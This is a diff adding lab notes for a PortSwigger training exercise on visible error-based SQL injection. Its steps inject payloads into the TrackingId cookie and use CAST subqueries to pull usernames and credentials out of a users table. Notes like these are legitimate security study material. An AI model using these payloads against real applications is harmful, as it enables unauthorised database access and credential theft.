@@ -73,9 +73,17 @@ hn8u07gig6zkt9947d47
 
 ## Lab 11: Visible error-based SQL injection [Link](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-error-based-sql-injection/sql-injection/blind/lab-sql-injection-visible-error-based)
 
-- 
+- Capture the GET/ request: Look for the Cookie: "TrackingId" > Send it to Repeater.
+- In Repeater, append a single quote to the value of your TrackingId cookie and send the request.
+`TrackingId=ogAZZfxtOKUELbuJ'` > Observe the error > TrackingId=ogAZZfxtOKUELbuJ'-- > Comment out the rest of the query > Observe the error.
+- Adapt the query to include a generic SELECT subquery and cast the returned value to an int data type: `TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--` > Observe the Error
+- Modify the Query: `TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--`
+- Adapt your generic SELECT statement so that it retrieves usernames from the database: `TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--` > Observe the error.
+- Delete the TrackingID value & Observe the error.
+- Modify the query to return only one row: `TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)`
+- Try to leak the Creds > Look for Creds on the page.
 
 
 ## Lab 12: Blind SQL injection with time delays and information retrieval [Link](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-exploiting-blind-sql-injection-by-triggering-time-delays/sql-injection/blind/lab-time-delays-info-retrieval)
-
+- 
 
